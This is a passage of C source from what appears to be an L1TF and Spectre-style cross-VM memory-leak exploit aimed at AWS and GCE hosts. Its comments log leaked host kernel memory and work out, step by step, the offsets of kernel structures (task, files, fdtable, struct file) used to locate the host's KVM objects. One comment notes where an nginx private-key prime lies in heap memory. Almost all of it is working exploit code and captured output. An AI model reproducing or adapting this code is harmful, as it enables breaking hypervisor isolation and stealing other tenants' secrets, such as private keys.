	// 			l1tf_leak(buf, base, kvm_np_pa+off, sizeof(buf));
	// 		fprintf(stderr, "kvm_np_pa + %4x  i.e.  %16lx:\n", off, kvm_np_pa+off);
	// 		display(buf, sizeof(buf));
	// 	}
	// }
	// kvm_np_pa +  100  i.e.         124a5c100:
	//    0:                 0   00 00 00 00 00 00 00 00 ........
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:                 1   01 00 00 00 00 00 00 00 ........
	//   18:  ffff9584f2d71058   58 10 d7 f2 84 95 ff ff X.......
	//   20:  ffff9584f2d71ce8   e8 1c d7 f2 84 95 ff ff ........
	//   28:  ffff9352eff70e40   40 0e f7 ef 52 93 ff ff @...R...
	//   30:  ffff934153430e80   80 0e 43 53 41 93 ff ff ..CSA...
	//   38:                 0   00 00 00 00 00 00 00 00 ........

	// // This code was meant to chase down the XARRAY structure, but it turns
	// // out (it seems) that on GCE the vcpus are just in a normal array, so no
	// // need for the below:
	// hpa_t kvm_next[2] = {0xffff9352eff70e40 - direct_map, 0xffff934153430e80 - direct_map};
	// char buf[0x40];
	// while (1) {
	// 	for (int k = 0; k < 2; k++) {
	// 		for (int i = 0; i < 10; i++)
	// 			l1tf_leak(buf, base, kvm_next[k], sizeof(buf));
	// 		fprintf(stderr, "kvm_next[%d]  i.e.  %16lx:\n", k, kvm_next[k]);
	// 		display(buf, sizeof(buf));
	// 		for (int j = 0; j < 0x40; j += 8) {
	// 			u64 *p = (u64 *)&buf[j];
	// 			if (((*p) >> 40) == (direct_map >> 40)) {
	// 				fprintf(stderr, "*p = %lx\n", *p);
	// 				hpa_t pa = *p - direct_map;
	// 				dump(pa);
	// 				char buf2[0x40];
	// 				for (int i = 0; i < 10; i++)
	// 					l1tf_leak(buf2, base, pa, sizeof(buf2));
	// 				display(buf2, 0x40);
	// 			}
	// 		}
	// 	}
	// }

	fprintf(stderr, "base = %lx, hcr3 = %lx, cr3 = %lx, hpa = %lx\n", base, hcr3, cr3, hpa);


// =============================================================================


	// #define N 64
	// for (int i = 0; i < N/8; i++)
	// 	*((uint64_t *)p + i) = 0x0123456789abcdef;
	// half_spectre_start(base, pa);
	// l1tf_do_leak(pa, N);
	// half_spectre_stop();

	// spectre_touch_base_start();
	// l1tf_do_leak(base, 0x10);
	// spectre_touch_base_stop();

	// @base: 00 5e de e6 48 93 ff ff 00 5d de e6 48 93 ff ff
	// phys_map[0] = ffff9348e6de5e00 = 0xffff9348c | 0x26de5e00
	// phys_map[1] = ffff9348e6de5d00 = 0xffff9348c | 0x26de5d00
	// base = 0x88d43f218 = 0x88 | 0x0d43f218

	// Assuming ffff9348e6de5d00 <-> 0x8a6de5d00, i.e. page_offset_base = 0xffff934040000000
	// *phys_map[0] = ffffffff84615070
	// *phys_map[1] = ffffffff84615f70

	// Continously leaking 16 bytes from physcial address 0x88d441200:
	// [sibling] starting half_spectre with idx = 3fd
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a 
	// fe 28 8e 76 82 97 c9 11 ae fd db c1 ee d7 9f 1a


	// for (uintptr_t high = 0x88; high >= 0x80; high--) {
	// 	uintptr_t pa_target = (high << 28) | 0x26de5e00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// 	pa_target = (high << 28) | 0x26de5d00;
	// 	half_spectre_start(base, pa_target);
	// 	l1tf_do_leak(pa_target, 0x10);
	// 	half_spectre_stop();

	// }


	// uintptr_t direct_map = 0xffff934040000000;

	// uintptr_t pa_target = 0xffffffff84615f70 - direct_map; // == 0x6cbf44615f70 == 108.7TB...
	// half_spectre_start(base, pa_target);
	// l1tf_do_leak(pa_target, 0x18);
	// half_spectre_stop();


	// Leaked 0xc0 bytes at direct map adddress 0xffff9348e6de5e00, i.e. pa (0xffff9348e6de5e00-0xffff934040000000)
}

void old_comm_and_task_reversing(void)
{

	// char comm[16];
	// // l1tf_leak(comm, base, pa(task_struct+OFF_COMM), 0x10);
	// display(comm, 0x10);

	// char tasks[0x40];
	// l1tf_leak(tasks, base, pa(task_struct+H_TASK_TASKS-0x10), 0x40);
	// display(tasks, 0x40);
	//    0:                0 00 00 00 00 00 00 00 00 ........
	//    8:    248be3fe15218 18 52 e1 3f be 48 02 00 .R.?.H..
	//   10: ffffffff8501a440 40 a4 01 85 ff ff ff ff @.......
	//   18: ffff93416c014a80 80 4a 01 6c 41 93 ff ff .J.lA...
	//   20:        f0000008c 8c 00 00 00 0f 00 00 00 ........
	//   28: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
	//   30: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
	//   38:  fff936091dba928 28 a9 db 91 60 93 ff 0f (...`...

	// const int len_tasks_next = 0x20;
	// char tasks_next[len_tasks_next];
	// l1tf_leak_multi(tasks_next, base, pa(0xffff93416c014a80), len_tasks_next, 11);
	// display(tasks_next, len_tasks_next);
	//  0:  ffff934214810a40   40 0a 81 14 42 93 ff ff @...B...
	//  8:  ffff93a1c66b2a80   80 2a 6b c6 a1 93 ff ff .*k.....
	// 10:       f00000f008c   8c 00 0f 00 00 0f 00 00 ........
	// 18:  ffff93416c014a98   98 4a 01 6c 41 93 ff ff .J.lA...

	// char comm[16];
	// l1tf_leak_multi(comm, base, pa(0xffff93416c014a80-H_TASK_TASKS+OFF_COMM), sizeof(comm), 11);
	// display(comm, sizeof(comm));
	//    0:  6961775f6b736174   74 61 73 6b 5f 77 61 69 task_wai
	//    8:    7275650f726574   74 65 72 0f 65 75 72 00 ter.eur.

	// const int len = 0xc0;
	// char data[len];
	// l1tf_leak(data, base, pa(0xffff93416c014a80-H_TASK_TASKS), len);
	// display(data, len);
}

void reverse_nginx(void)
{
	// At offset 0x008b9a2 from the start of the heap of nginx lies the first prime of the private key. (nginx master process)
}

void reverse_kvm_module(hpa_t base)
{
	hpa_t vcpu = -1; //OWN_VCPU - HOST_DIRECT_MAP;
	dump(vcpu);

	while (1) {
		char data[0x10];
		for (int i = 0; i < 100; i++) {
			l1tf_leak(data, base, vcpu+0x10, sizeof(data));
			display(data, sizeof(data));
		}
	}
	//   0:  ffff936a91dba828   28 a8 db 91 6a 93 ff ff (...j...
	//   8:  ffffffff8555d368   68 d3 55 85 ff ff ff ff h.U.....

	//    0:  ffffab3801795000   00 50 79 01 38 ab ff ff .Py.8...
	//    8:                 0   00 00 00 00 00 00 00 00 ........
	//   10:  ffff93f671ad5280   80 52 ad 71 f6 93 ff ff .R.q....
	//   18:  ffffffff89e122f0   f0 22 e1 89 ff ff ff ff ."......
	//   20:                 0   00 00 00 00 00 00 00 00 ........
	//   28:                 0   00 00 00 00 00 00 00 00 ........
}

void reverse_aws_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task)
{
	fprintf(stderr, "\nfind_own_kvm_via_fds(base=%lx, hdm=%lx, vcpu=%lx, task=%lx)\n" HLINE, base, hdm, vcpu, task);

	// dump(task);
	// dump((u64)H_TASK_COMM);
	// reverse_after(base, task-hdm+H_TASK_COMM, hdm, "task+0xc38");
	//                           task = ffff93f671ad4ce0
	//                          0xc48 =              c48
	// dm ffff93f671ad5928 | pa   12b1ad5928 |       task+0xc38+   0 = 353934343a6d6f64
	// dm ffff93f671ad5930 | pa   12b1ad5930 |       task+0xc38+   8 =   35363134343639
	// dm ffff93f671ad5938 | pa   12b1ad5938 |       task+0xc38+  10 =                0
	// dm ffff93f671ad5940 | pa   12b1ad5940 |       task+0xc38+  18 =                0
	// dm ffff93f671ad5948 | pa   12b1ad5948 |       task+0xc38+  20 =                0
	// dm ffff93f671ad5950 | pa   12b1ad5950 |       task+0xc38+  28 = ffff93f6742f1040
	// dm ffff93f671ad5958 | pa   12b1ad5958 |       task+0xc38+  30 = ffff93f673b38dc0 <-- files
	// dm ffff93f671ad5960 | pa   12b1ad5960 |       task+0xc38+  38 = ffff93f60692c480
	// dm ffff93f671ad5968 | pa   12b1ad5968 |       task+0xc38+  40 = ffff93f67423f080
	// dm ffff93f671ad5970 | pa   12b1ad5970 |       task+0xc38+  48 = ffff93f6742339c0
	// dm ffff93f671ad5978 | pa   12b1ad5978 |       task+0xc38+  50 = fffffffc3ffbf037
	// dm ffff93f671ad5980 | pa   12b1ad5980 |       task+0xc38+  58 =                0
	// dm ffff93f671ad5988 | pa   12b1ad5988 |       task+0xc38+  60 =                0
	// dm ffff93f671ad5990 | pa   12b1ad5990 |       task+0xc38+  68 = ffff93f671ad5990
	// dm ffff93f671ad5998 | pa   12b1ad5998 |       task+0xc38+  70 = ffff93f671ad5990
	// dm ffff93f671ad59a0 | pa   12b1ad59a0 |       task+0xc38+  78 =                0
	// dm ffff93f671ad59a8 | pa   12b1ad59a8 |       task+0xc38+  80 =                0
	// dm ffff93f671ad59b0 | pa   12b1ad59b0 |       task+0xc38+  88 =                0
	// dm ffff93f671ad59b8 | pa   12b1ad59b8 |       task+0xc38+  90 =                2
	// dm ffff93f671ad59c0 | pa   12b1ad59c0 |       task+0xc38+  98 =                0
	// dm ffff93f671ad59c8 | pa   12b1ad59c8 |       task+0xc38+  a0 =        200000002
	// Conclusion: H_TASK_FILES = H_TASK_COMM + 0x30
	
	// hva_t files = 0xffff93f673b38dc0; dump(files);
	// reverse_after(base, files-hdm, hdm, "files");
	//                          files = ffff93f673b38dc0
	// dm ffff93f673b38dc0 | pa   12b3b38dc0 |            files+   0 = ffff930000000003
	// dm ffff93f673b38dc8 | pa   12b3b38dc8 |            files+   8 = ffff93f600000000
	// dm ffff93f673b38dd0 | pa   12b3b38dd0 |            files+  10 = ffff93f673b38dd0
	// dm ffff93f673b38dd8 | pa   12b3b38dd8 |            files+  18 = ffff93f673b38dd0
	// dm ffff93f673b38de0 | pa   12b3b38de0 |            files+  20 = ffff93e461a4d5c0 <-- fdt
	// dm ffff93f673b38de8 | pa   12b3b38de8 |            files+  28 = ffff93e400000040
	// dm ffff93f673b38df0 | pa   12b3b38df0 |            files+  30 = ffff93f673b38e60
	// dm ffff93f673b38df8 | pa   12b3b38df8 |            files+  38 = ffff93f673b38e48
	// dm ffff93f673b38e00 | pa   12b3b38e00 |            files+  40 = ffff93f673b38e50
	// Conclusion: H_FILES_FDT = 0x20
                 

	// hva_t fdt = 0xffff93e461a4d5c0; dump(fdt);
	// reverse_after(base, fdt-hdm, hdm, "fdt");
	//                            fdt = ffff93e461a4d5c0
	// dm ffff93e461a4d5c0 | pa     a1a4d5c0 |              fdt+   0 =        100008000
	// dm ffff93e461a4d5c8 | pa     a1a4d5c8 |              fdt+   8 = ffff93e45b3c0000 <-- fd
	// dm ffff93e461a4d5d0 | pa     a1a4d5d0 |              fdt+  10 = ffff93e45adad000
	// dm ffff93e461a4d5d8 | pa     a1a4d5d8 |              fdt+  18 = ffff93e45adac000
	// dm ffff93e461a4d5e0 | pa     a1a4d5e0 |              fdt+  20 = ffff93e45adae000
	// dm ffff93e461a4d5e8 | pa     a1a4d5e8 |              fdt+  28 = ffff93e461a4d5e0
	// dm ffff93e461a4d5f0 | pa     a1a4d5f0 |              fdt+  30 =                0
	// Conclusion: H_FDTABLE_FD = 0x8

	// hva_t fd = 0xffff93e45b3c0000; dump(fd);
	// reverse_after(base, fd-hdm, hdm, "fd");
	//                             fd = ffff93e45b3c0000
	// dm ffff93e45b3c0000 | pa     9b3c0000 |               fd+   0 = ffff93e3c6600800
	// dm ffff93e45b3c0008 | pa     9b3c0008 |               fd+   8 = ffff93e3c6600800
	// dm ffff93e45b3c0010 | pa     9b3c0010 |               fd+  10 = ffff93e3c6600800
	// dm ffff93e45b3c0018 | pa     9b3c0018 |               fd+  18 = ffff93e3dfd33100
	// dm ffff93e45b3c0020 | pa     9b3c0020 |               fd+  20 = ffff93e45b197700
	// dm ffff93e45b3c0028 | pa     9b3c0028 |               fd+  28 = ffff93e45b197000
	// Conclusion: the (struct file *)-array starts at `fd`

	// hva_t fd0 = 0xffff93e3c6600800; dump(fd0);
	// reverse_after(base, fd0-hdm, hdm, "fd0");
	// OUTPUT MISSING BUT THIS SHOWS THE 0x100 bytes of a `struct file`,
	// indicating where private_data might be, due to it being a valid pointer
	// for stdin (fd=0).

	// hva_t fd_data[0x30];
	// leak(fd_data, base, fd-hdm, sizeof(fd_data));
	// display(fd_data, sizeof(fd_data));
	// hva_t fd_data[0x30] = {
	// 	0xffff93e3c6600800,
	// 	0xffff93e3c6600800,
	// 	0xffff93e3c6600800,
	// 	0xffff93e3dfd33100,
	// 	0xffff93e45b197700,
	// 	0xffff93e45b197000,
	// 	0xffff93e3dfd32800,
	// 	0xffff93e3dfd33d00,
	// 	0xffff93e45b196000,
	// 	0xffff93e45b197400,
	// 	0xffff93e45b196900,
	// 	0xffff93e45b197d00,
	// 	0xffff93e45b197200,
	// 	0xffff93e45b197500,
	// 	0xffff93e45b196200,
	// 	0xffff93e45b197a00,
	// 	0xffff93e45b197600,
	// 	0xffff93e45b197e00,
	// 	0xffff93e45b197100,
	// 	0xffff93e45b196100,
	// 	0xffff93e45b196f00,
	// 	0xffff93e45b196e00,
	// 	0xffff93e45b196700,
	// 	0xffff93e45b197f00,
	// 	0xffff93e45b196800,
	// 	0xffff93e45b197300,
	// 	0xffff93e45b196600,
	// 	0xffff93e45b197900,
	// 	0xffff93e45b196400,
	// 	0xffff93e45b197c00,
	// 	0xffff93e45b196a00,
	// 	0xffff93e45b190d00,
	// 	0xffff93e45b190000,
	// 	0xffff93e45b191d00,
	// 	0xffff93e45b191700,
	// 	0xffff93e45b191100,
	// 	0xffff93e45b190f00,
	// 	0xffff93e45b190e00,
	// 	0xffff93e45b191300,
	// 	0xffff93e45b191c00,
	// 	0xffff93e45b190600,
	// 	0xffff93e45b197800,
	// 	0xffff93e45b190400,
	// 	0xffff93e45b192b00,
	// 	0xffff93e45b18b600
	// };

	// For all candidate private_data offsets (0xc0 and 0xe8 below), try to
	// find a vmalloc-ed pointer: candidate for our `struct kvm`.
	// for (int i = 0; i < 0x30; i++) {
	// 	dump(i);
	// 	dump(fd_data[i]);
	// 	reverse_after(base, fd_data[i]-hdm+0xc0, hdm, "fd_data[i]+0xc0", 0x8);
	// 	reverse_after(base, fd_data[i]-hdm+0xe8, hdm, "fd_data[i]+0xe8", 0x8);
	// }
	// FOUND: at fd[9]+0xc0, we see our own kvm pointer.

	hva_t kvm_candidate = 0xffff93e45b1974c0; // at fd[9] + 0xc0
	dump(leak64(base, kvm_candidate-hdm));
	dump(OWN_KVM);
}

void reverse_gce_task_files_fdt_fd_priv(hpa_t base, hva_t hdm, hpa_t hcr3, hva_t vcpu, hva_t task)
{
	fprintf(stderr, "\nfind_own_kvm_via_fds(base=%lx, hdm=%lx, vcpu=%lx, task=%lx)\n" HLINE, base, hdm, vcpu, task);

	dump(task);
	dump((u64)H_TASK_COMM);
	// reverse_after(base, task-hdm+H_TASK_COMM, hdm, "task+COMM", 0x90);
	//                           task = ffff936fa3088040
	//                     (u64)0xc38 =              c38
	// dm ffff936fa3088c78 | pa   2f63088c78 |        task+COMM+   0 = 6f00302d55504356
	// dm ffff936fa3088c80 | pa   2f63088c80 |        task+COMM+   8 =   656c6c6f72746e
	// dm ffff936fa3088c88 | pa   2f63088c88 |        task+COMM+  10 =                0
	// dm ffff936fa3088c90 | pa   2f63088c90 |        task+COMM+  18 = ffff9341801f50e0
	// dm ffff936fa3088c98 | pa   2f63088c98 |        task+COMM+  20 = ffff936fa3088c98
	// dm ffff936fa3088ca0 | pa   2f63088ca0 |        task+COMM+  28 = ffff936fa3088c98
	// dm ffff936fa3088ca8 | pa   2f63088ca8 |        task+COMM+  30 = ffff9341571b7940
	// dm ffff936fa3088cb0 | pa   2f63088cb0 |        task+COMM+  38 = ffff934154313600
	// dm ffff936fa3088cb8 | pa   2f63088cb8 |        task+COMM+  40 = ffff93414def56c0
	// dm ffff936fa3088cc0 | pa   2f63088cc0 |        task+COMM+  48 = ffff93417311bb40
	// dm ffff936fa3088cc8 | pa   2f63088cc8 |        task+COMM+  50 = ffff93414d72b3c0
	// dm ffff936fa3088cd0 | pa   2f63088cd0 |        task+COMM+  58 =                0
	// dm ffff936fa3088cd8 | pa   2f63088cd8 |        task+COMM+  60 =                0
	// dm ffff936fa3088ce0 | pa   2f63088ce0 |        task+COMM+  68 =                0
	// dm ffff936fa3088ce8 | pa   2f63088ce8 |        task+COMM+  70 = ffff936fa3088ce8
	// dm ffff936fa3088cf0 | pa   2f63088cf0 |        task+COMM+  78 = ffff936fa3088ce8
	// dm ffff936fa3088cf8 | pa   2f63088cf8 |        task+COMM+  80 =                0
	// dm ffff936fa3088d00 | pa   2f63088d00 |        task+COMM+  88 =     7f389b8d9000
	// dm ffff936fa3088d08 | pa   2f63088d08 |        task+COMM+  90 =            20000
	// dm ffff936fa3088d10 | pa   2f63088d10 |        task+COMM+  98 =                0
	// dm ffff936fa3088d18 | pa   2f63088d18 |        task+COMM+  a0 =                0
	// dm ffff936fa3088d20 | pa   2f63088d20 |        task+COMM+  a8 =                0
	// dm ffff936fa3088d28 | pa   2f63088d28 |        task+COMM+  b0 = ffffffffffffffff
	// dm ffff936fa3088d30 | pa   2f63088d30 |        task+COMM+  b8 =                0
	// dm ffff936fa3088d38 | pa   2f63088d38 |        task+COMM+  c0 =                0
	// dm ffff936fa3088d40 | pa   2f63088d40 |        task+COMM+  c8 =                f
	// dm ffff936fa3088d48 | pa   2f63088d48 |        task+COMM+  d0 =               11
	// dm ffff936fa3088d50 | pa   2f63088d50 |        task+COMM+  d8 =                0

	// Conclusion: H_TASK_FILES = H_TASK_COMM + 0x48 ??

	// hva_t file_candidates[] = {
	// 	0xffff9341801f50e0,
	// 	0xffff9341571b7940,
	// 	0xffff934154313600,
	// 	0xffff93414def56c0,
	// 	0xffff93417311bb40,
	// 	0xffff93414d72b3c0,
	// };
	// for (u64 i = 0; i < sizeof(file_candidates)/sizeof(hva_t); i++) {
	// 	dump(i);
	// 	hva_t files = file_candidates[i]; dump(files);
	// 	reverse_after(base, files-hdm, hdm, "files", 0x80);
	// }
	// 	i =                0
	// 	files = ffff9341801f50e0
	// dm ffff9341801f50e0 | pa    1401f50e0 |            files+   0 =              1aa
	// dm ffff9341801f50e8 | pa    1401f50e8 |            files+   8 = ffff9341801f50e8 // empty list
	// dm ffff9341801f50f0 | pa    1401f50f0 |            files+  10 = ffff9341801f50e8 // empty list
	// dm ffff9341801f50f8 | pa    1401f50f8 |            files+  18 =                0
	// dm ffff9341801f5100 | pa    1401f5100 |            files+  20 =                0
	// dm ffff9341801f5108 | pa    1401f5108 |            files+  28 =                0
	// dm ffff9341801f5110 | pa    1401f5110 |            files+  30 =                0
	// dm ffff9341801f5118 | pa    1401f5118 |            files+  38 =                0
	// dm ffff9341801f5120 | pa    1401f5120 |            files+  40 = 6d2e70756f726763
	// dm ffff9341801f5128 | pa    1401f5128 |            files+  48 = 68747065642e7861
	// dm ffff9341801f5130 | pa    1401f5130 |            files+  50 =     6c6f72746e00
	// dm ffff9341801f5138 | pa    1401f5138 |            files+  58 =                0
	// dm ffff9341801f5140 | pa    1401f5140 |            files+  60 = 6d2e746573757063
	// dm ffff9341801f5148 | pa    1401f5148 |            files+  68 = 72705079706f6d65
	// dm ffff9341801f5150 | pa    1401f5150 |            files+  70 =     657275737365
	// dm ffff9341801f5158 | pa    1401f5158 |            files+  78 =                0
	// 	    i =                1
	// 	files = ffff9341571b7940
	// dm ffff9341571b7940 | pa    1171b7940 |            files+   0 =              1a7
	// dm ffff9341571b7948 | pa    1171b7948 |            files+   8 =        20000107e
	// dm ffff9341571b7950 | pa    1171b7950 |            files+  10 =                0
	// dm ffff9341571b7958 | pa    1171b7958 |            files+  18 = ffff93414e3006a0
	// dm ffff9341571b7960 | pa    1171b7960 |            files+  20 = fff0904233b1dcc0
	// dm ffff9341571b7968 | pa    1171b7968 |            files+  28 = ffff934150d19ea0
	// dm ffff9341571b7970 | pa    1171b7970 |            files+  30 = ffff93a14c3f3300
	// dm ffff9341571b7978 | pa    1171b7978 |            files+  38 =                0
	// dm ffff9341571b7980 | pa    1171b7980 |            files+  40 =                0
	// dm ffff9341571b7988 | pa    1171b7988 |            files+  48 =       1200000000
	// dm ffff9341571b7990 | pa    1171b7990 |            files+  50 =                0
	// dm ffff9341571b7998 | pa    1171b7998 |            files+  58 = ffff93415419db60
	// dm ffff9341571b79a0 | pa    1171b79a0 |            files+  60 = ffff93428d2fc6c0
	// dm ffff9341571b79a8 | pa    1171b79a8 |            files+  68 = ffff93415419db60
	// dm ffff9341571b79b0 | pa    1171b79b0 |            files+  70 = ffff93428d2fc6c0
	// dm ffff9341571b79b8 | pa    1171b79b8 |            files+  78 =                0
	// 	    i =                2
	// 	files = ffff934154313600
	// dm ffff934154313600 | pa    114313600 |            files+   0 =    70500000001a6
	// dm ffff934154313608 | pa    114313608 |            files+   8 =                0
	// dm ffff934154313610 | pa    114313610 |            files+  10 = ffff934154313610 // empty list
	// dm ffff934154313618 | pa    114313618 |            files+  18 = ffff934154313610 // empty list
	// dm ffff934154313620 | pa    114313620 |            files+  20 = f0ff93425e259700  <-- look promising, but nibbles missing...
	// dm ffff934154313628 | pa    114313628 |            files+  28 =               40
	// dm ffff934154313630 | pa    114313630 |            files+  30 = ffff9341543136a0
	// dm ffff934154313638 | pa    114313638 |            files+  38 = ffff934154313688
	// dm ffff934154313640 | pa    114313640 |            files+  40 = ffff934154313690
	// dm ffff934154313648 | pa    114313648 |            files+  48 = ffff934154313698
	// dm ffff934154313650 | pa    114313650 |            files+  50 =                0
	// dm ffff934154313658 | pa    114313658 |            files+  58 =                0
	// dm ffff934154313660 | pa    114313660 |            files+  60 =                0
	// dm ffff934154313668 | pa    114313668 |            files+  68 =                0
	// dm ffff934154313670 | pa    114313670 |            files+  70 =                0
	// dm ffff934154313678 | pa    114313678 |            files+  78 =                0
	// 	    i =                3
	// 	files = ffff93414def56c0
	// dm ffff93414def56c0 | pa    10def56c0 |            files+   0 =              1a9
	// dm ffff93414def56c8 | pa    10def56c8 |            files+   8 = ffff934159c90590
	// dm ffff93414def56d0 | pa    10def56d0 |            files+  10 = ffff93429704e000
	// dm ffff93414def56d8 | pa    10def56d8 |            files+  18 = ffff93a08cb19a00
	// dm ffff93414def56e0 | pa    10def56e0 |            files+  20 = ffffffff85001040
	// dm ffff93414def56e8 | pa    10def56e8 |            files+  28 = ffffffff867c2040
	// dm ffff93414def56f0 | pa    10def56f0 |            files+  30 = ffffffff8545b868
	// dm ffff93414def56f8 | pa    10def56f8 |            files+  38 = ffffffff0545b868
	// dm ffff93414def5700 | pa    10def5700 |            files+  40 = ffffffff854619f8
	// dm ffff93414def5708 | pa    10def5708 |            files+  48 =                0
	// dm ffff93414def5710 | pa    10def5710 |            files+  50 = ffff93a195d306c0
	// dm ffff93414def5718 | pa    10def5718 |            files+  58 = ffffffff854c2f80
	// dm ffff93414def5720 | pa    10def5720 |            files+  60 = ffff93a08cb19a00
	// dm ffff93414def5728 | pa    10def5728 |            files+  68 = ffffffff850b1d40
	// dm ffff93414def5730 | pa    10def5730 |            files+  70 = ffffffff867c2040
	// dm ffff93414def5738 | pa    10def5738 |            files+  78 = ffffffff8545b868
	// 	    i =                4
	// 	files = ffff93417311bb40
	// dm ffff93417311bb40 | pa    13311bb40 |            files+   0 =      1a9000001a9
	// dm ffff93417311bb48 | pa    13311bb48 |            files+   8 =              1aa
	// dm ffff93417311bb50 | pa    13311bb50 |            files+  10 = ffff934214810c08
	// dm ffff93417311bb58 | pa    13311bb58 |            files+  18 = ffff93a15a644bc8
	// dm ffff93417311bb60 | pa    13311bb60 |            files+  20 =                0
	// dm ffff93417311bb68 | pa    13311bb68 |            files+  28 = ffff93417311bb68 // empty list
	// dm ffff93417311bb70 | pa    13311bb70 |            files+  30 = ffff93417311bb68 // empty list
	// dm ffff93417311bb78 | pa    13311bb78 |            files+  38 = ffff934214810140 <-- maybe also promising?
	// dm ffff93417311bb80 | pa    13311bb80 |            files+  40 = ffff93417311bb80 // empty list
	// dm ffff93417311bb88 | pa    13311bb88 |            files+  48 = ffff93417311bb80 // empty list
	// dm ffff93417311bb90 | pa    13311bb90 |            files+  50 =                0
	// dm ffff93417311bb98 | pa    13311bb98 |            files+  58 =                0
	// dm ffff93417311bba0 | pa    13311bba0 |            files+  60 =                0
	// dm ffff93417311bba8 | pa    13311bba8 |            files+  68 =                0
	// dm ffff93417311bbb0 | pa    13311bbb0 |            files+  70 =                0
	// dm ffff93417311bbb8 | pa    13311bbb8 |            files+  78 =    f643200000002
	// 	    i =                5
	// 	files = ffff93414d72b3c0
	// dm ffff93414d72b3c0 | pa    10d72b3c0 |            files+   0 =      1a600000001
	// dm ffff93414d72b3c8 | pa    10d72b3c8 |            files+   8 = 8b48000000000000
	// dm ffff93414d72b3d0 | pa    10d72b3d0 |            files+  10 = ffff93414d72b3d0 // empty list
	// dm ffff93414d72b3d8 | pa    10d72b3d8 |            files+  18 = ffff93414d72b3d0 // empty list
	// dm ffff93414d72b3e0 | pa    10d72b3e0 |            files+  20 =                1
	// dm ffff93414d72b3e8 | pa    10d72b3e8 |            files+  28 =          4000000
	// dm ffff93414d72b3f0 | pa    10d72b3f0 |            files+  30 =     7f389e38fe80
	// dm ffff93414d72b3f8 | pa    10d72b3f8 |            files+  38 =                0
	// dm ffff93414d72b400 | pa    10d72b400 |            files+  40 =     556b028ed620
	// dm ffff93414d72b408 | pa    10d72b408 |            files+  48 =          4000004
	// dm ffff93414d72b410 | pa    10d72b410 |            files+  50 =     7f389e38fe80
	// dm ffff93414d72b418 | pa    10d72b418 |            files+  58 =                0
	// dm ffff93414d72b420 | pa    10d72b420 |            files+  60 =                0
	// dm ffff93414d72b428 | pa    10d72b428 |            files+  68 =                0
	// dm ffff93414d72b430 | pa    10d72b430 |            files+  70 =                0
	// dm ffff93414d72b438 | pa    10d72b438 |            files+  78 =                0
        
	hva_t promising_file_cand = 0xffff934154313600 + 0x20; dump(promising_file_cand);
	// for (int i = 0; i < 10; i++)
	// 	reverse_after(base, promising_file_cand-hdm, hdm, "promising_file_cand", 8);
	// promising_file_cand = ffff934154313620
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259700
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259700
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
	// dm ffff934154313620 | pa    114313620 | promising_file_cand+   0 = ffff93425e259718
		
	hva_t fdt_cand = 0xffff93425e259700; dump(fdt_cand);
	// reverse_after(base, fdt_cand-hdm, hdm, "fdt_cand", 0x40);
	// fdt_cand = ffff93425e259700                               
	// dm ffff93425e259700 | pa    21e259700 |         fdt_cand+   0 =        100000400
	// dm ffff93425e259708 | pa    21e259708 |         fdt_cand+   8 = ffff93429611c000
	// dm ffff93425e259710 | pa    21e259710 |         fdt_cand+  10 = ffff9341f2c55280
	// dm ffff93425e259718 | pa    21e259718 |         fdt_cand+  18 = ffff9341f2c55200
	// dm ffff93425e259720 | pa    21e259720 |         fdt_cand+  20 = ffff9341f2c55300
	// dm ffff93425e259728 | pa    21e259728 |         fdt_cand+  28 = ffff93425e259720
	// dm ffff93425e259730 | pa    21e259730 |         fdt_cand+  30 =  2233c0518093216
	// dm ffff93425e259738 | pa    21e259738 |         fdt_cand+  38 = 1c2b103804313e08
	
	hva_t fd_cand = 0xffff93429611c000; dump(fd_cand);
	// reverse_after(base, fd_cand-hdm, hdm, "fd_cand", 0x30*8);
	// dm ffff93429611c000 | pa    25611c000 |          fd_cand+   0 = ffff934215403900
	// dm ffff93429611c008 | pa    25611c008 |          fd_cand+   8 = ffff930215403f00
	// dm ffff93429611c010 | pa    25611c010 |          fd_cand+  10 = ffff934210403b00
	// dm ffff93429611c018 | pa    25611c018 |          fd_cand+  18 = ffff9342bf180600
	// dm ffff93429611c020 | pa    25611c020 |          fd_cand+  20 = ffff93420f180800
	// dm ffff93429611c028 | pa    25611c028 |          fd_cand+  28 = ffff9342bf180500
	// dm ffff93429611c030 | pa    25611c030 |          fd_cand+  30 = ffff934294007000
	// Conclusion: the (struct file *)-array starts at `fd`
	
	

	// hva_t fds[] = {
	// 	0xffff934215403900,
	// 	0xffff934215403f00,
	// 	0xffff934215403b00,
	// 	0xffff9342bf180600,
	// 	0xffff9342bf180800,
	// 	0xffff9342bf180500,
	// 	0xffff934294007000,
	// };
	// for (u64 i = 0; i < sizeof(fds)/sizeof(hva_t); i++) {
	// 	dump(i); dump(fds[i]);
	// 	reverse_after(base, fds[i]-hdm, hdm, "struct file", 0x100);
	// }
	// int cand_priv_offs[] = {0x10, 0x18, 0x20, 0x28, 0x58, 0x60, 0x90, 0xd8, 0xf0, 0xf8};
	int cand_priv_offs[] = {0x0, 0x10, 0x18, 0x20, 0x28, 0x30, 0x50, 0x58, 0x60, 0x78, 0x90, 0xb0, 0xc8, 0xd0, 0xd8, 0xf0, 0xf8};

	hva_t fileps[] = {
		0xffff934215403900,
		0xffff934215403f00,
		0xffff934215403b00,
		0xffff9342bf180600,
		0xffff9342bf180800,
		0xffff9342bf180500,
		0xffff934294007000,
		0xffff934294007f00,
		0xffff934264cc1c00,
		0xffff934200075400,
		0xffff934294075000,
